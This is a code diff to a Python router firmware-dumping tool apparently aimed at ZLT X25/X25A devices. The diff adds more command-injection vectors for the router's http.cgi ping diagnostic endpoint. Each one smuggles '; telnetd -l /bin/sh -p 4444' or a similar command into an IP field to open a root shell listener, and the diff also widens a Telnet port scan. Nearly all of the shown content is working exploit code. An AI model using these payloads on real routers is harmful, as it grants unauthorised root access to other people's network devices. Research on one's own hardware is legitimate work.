@@ -770,10 +770,11 @@ class ZLTFirmwareDumperCLI:
                             self._print_system_banner()
                             return
 
-            # Fallback: probe stock ports
-            logger.info("Injection failed — probing stock Telnet ports")
-            with console.status("[cyan]Probing Telnet ports 23 / 9876 / 4444 / 4445...[/cyan]"):
-                for port in (23, 9876, 4444, 4445):
+            # Fallback: probe stock ports + common alternates
+            logger.info("Injection failed — probing Telnet ports (extended scan)")
+            with console.status("[cyan]Probing common Telnet ports (21-24, 2323, 4444, 4445, 9876)...[/cyan]"):
+                # X25 firmware sometimes has telnet on 21, 22, or 2323
+                for port in (23, 9876, 4444, 4445, 21, 22, 24, 2323):
                     client = RouterShellClient(self.router_ip, port, timeout=3.0)
                     if client.connect(self.telnet_creds):
                         self.shell = client
@@ -824,24 +825,69 @@ class ZLTFirmwareDumperCLI:
                     console.print(f"  [red]✘  Re-auth failed: {err}[/red]")
 
     def _get_httpcgi_injection_vectors(self):
-        """X25 / X25A  (yocto_orca)  —  JSON ping diagnostic injection."""
-        return [
-            ("http.cgi inject /bin/sh → :4444", 4444, {
-                "enabled": "1", "ip": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
-                "cmd": 172, "method": "POST", "subcmd": 6,
-                "language": "EN", "sessionId": self.session_id,
-            }),
-            ("http.cgi inject /bin/ash → :4445", 4445, {
-                "enabled": "1", "ip": "127.0.0.1 ; telnetd -l /bin/ash -p 4445",
-                "cmd": 172, "method": "POST", "subcmd": 6,
-                "language": "EN", "sessionId": self.session_id,
-            }),
-            ("http.cgi inject telnetd → :23", 23, {
-                "enabled": "1", "ip": f"{self.router_ip} ; telnetd -l /bin/sh",
-                "cmd": 172, "method": "POST", "subcmd": 6,
-                "language": "EN", "sessionId": self.session_id,
-            }),
-        ]
+        """X25 / X25A  (yocto_orca)  —  JSON ping diagnostic injection.
+        
+        Multiple cmd numbers tried because different X25 firmware revisions
+        use different diagnostic command IDs:
+          cmd 172 subcmd 6 = WAN ping diagnostic (common)
+          cmd 5   subcmd 1 = Network test (some builds)
+          cmd 113          = System diagnostic (alternate)
+        """
+        vectors = []
+        
+        # Standard ping diagnostic (cmd 172 subcmd 6)
+        for shell, port in [("/bin/sh", 4444), ("/bin/ash", 4445)]:
+            vectors.append((
+                f"http.cgi cmd:172 inject {shell} → :{port}", port, {
+                    "enabled": "1",
+                    "ip": f"127.0.0.1 ; telnetd -l {shell} -p {port}",
+                    "cmd": 172,
+                    "method": "POST",
+                    "subcmd": 6,
+                    "language": "EN",
+                    "sessionId": self.session_id,
+                }
+            ))
+        
+        # Alternative: cmd 5 (network tools on some X25 builds)
+        vectors.append((
+            "http.cgi cmd:5 inject → :4444", 4444, {
+                "cmd": 5,
+                "method": "POST",
+                "subcmd": 1,
+                "language": "EN",
+                "testType": "ping",
+                "ipAddress": "127.0.0.1 ; telnetd -l /bin/sh -p 4444",
+                "sessionId": self.session_id,
+            }
+        ))
+        
+        # Alternative: cmd 113 (system diagnostics)
+        vectors.append((
+            "http.cgi cmd:113 inject → :4445", 4445, {
+                "cmd": 113,
+                "method": "POST",
+                "action": "ping",
+                "target": "127.0.0.1 ; telnetd -l /bin/sh -p 4445",
+                "language": "EN",
+                "sessionId": self.session_id,
+            }
+        ))
+        
+        # Standard telnetd on :23
+        vectors.append((
+            "http.cgi cmd:172 telnetd → :23", 23, {
+                "enabled": "1",
+                "ip": f"{self.router_ip} ; telnetd -l /bin/sh",
+                "cmd": 172,
+                "method": "POST",
+                "subcmd": 6,
+                "language": "EN",
+                "sessionId": self.session_id,
+            }
+        ))
+        
+        return vectors
 
     def _get_goform_injection_vectors(self):
         """M30 / M60 / MiFi  —  goform ping/traceroute diagnostic injection."""
